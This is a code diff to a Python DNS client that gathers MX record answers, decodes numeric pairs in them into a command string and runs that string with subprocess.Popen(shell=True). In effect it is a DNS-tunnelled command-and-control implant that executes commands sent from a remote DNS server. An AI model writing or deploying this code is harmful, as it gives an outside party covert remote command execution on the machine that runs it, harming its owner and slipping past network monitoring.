@@ -441,7 +441,7 @@ class DNSMessageFormat:
         for answer in self.answers:
                 # retVal.append(answer.resource_data.data)
             if answer.type == 15:
-                print(answer.getElement().getElement())
+                retVal += answer.getElement().getElement()
         return retVal
 
 
@@ -473,12 +473,13 @@ class DNSClient:
         return True
 
     def cmdDecode(self, results):
-        rawCommand = results[0]
+        rawCommand = ""
+        for result in results:
+            rawCommand += result
         commandParts = [rawCommand[i:i + 2] for i in range(0, len(rawCommand), 2)]
         command = ""
         for part in commandParts:
             command += chr(int(part)+32)
-        print(command)
         return command
 
 
@@ -500,7 +501,9 @@ class DNSClient:
             format.print_result()
             results = format.get_results()
             if len(results) > 0:
-                command = self.cmdDecode(results[0])
+                command = self.cmdDecode(results)
+                # print(results)
+                print(command)
                 out = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                 (stdout, stderr) = out.communicate()
             self.socket.close()
